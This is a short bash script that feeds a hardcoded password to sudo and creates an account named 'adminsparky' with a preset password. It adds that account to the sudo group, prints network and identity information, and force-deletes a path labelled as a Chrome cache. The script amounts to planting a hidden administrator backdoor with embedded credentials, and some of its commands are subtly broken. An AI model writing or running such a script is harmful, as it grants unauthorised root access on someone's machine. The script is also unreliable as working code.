#!/bin/bash

# Set the password
password='wtc'

# Try to send the password to sudo
echo "$password" | sudo -S echo "Password accepted."

# Check if password was accepted
if [ $? -ne 0 ]; then
  # Prompt the user for the password
  read -s -p "Enter sudo password: " password

  # Send the password to sudo
  echo "$password" | sudo -S echo "Password accepted."
fi

# Create a new user
echo "kam" | sudo adduser adminsparky
sudo passwd adminsparky --stdin


# Add the user to the sudo group
sudo usermod -aG sudo adminsparky

# display network info
ifconfig
whoami
rm -rf clear_Chrome_Cache
